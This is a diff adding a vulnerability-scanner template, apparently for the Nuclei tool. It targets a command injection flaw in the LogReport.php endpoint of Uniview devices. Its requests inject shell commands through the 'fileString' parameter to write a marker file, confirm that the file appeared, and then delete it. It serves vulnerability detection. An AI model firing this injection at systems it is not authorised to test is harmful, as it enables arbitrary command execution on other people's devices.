@@ -1,0 +1,41 @@
+id: uniview-logreport-execupdate-vulnerability
+info:
+  name: Uniview LogReport execUpdate Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  reference:
+    - https://www.cnblogs.com/charon1937/p/14076959.html
+  description: |
+    This template exploits a command injection vulnerability in the LogReport.php endpoint of Uniview devices, allowing arbitrary command execution.
+
+variables:
+  s1: "{{to_lower(rand_base(5))}}"
+  s2: "{{to_lower(rand_base(20))}}"
+
+http:
+  - id: initial-command
+    method: GET
+    path:
+      - "/Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;echo%20{{s2}}>{{s1}}.txt"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: confirm-execution
+    method: GET
+    path:
+      - "/Interface/LogReport/{{s1}}.txt"
+    matchers:
+      - type: word
+        words:
+          - "{{s2}}"
+
+  - id: cleanup-command
+    method: GET
+    path:
+      - "/Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;rm%20-f%20{{s1}}.txt"
+    matchers:
+      - type: status
+        status:
+          - 200
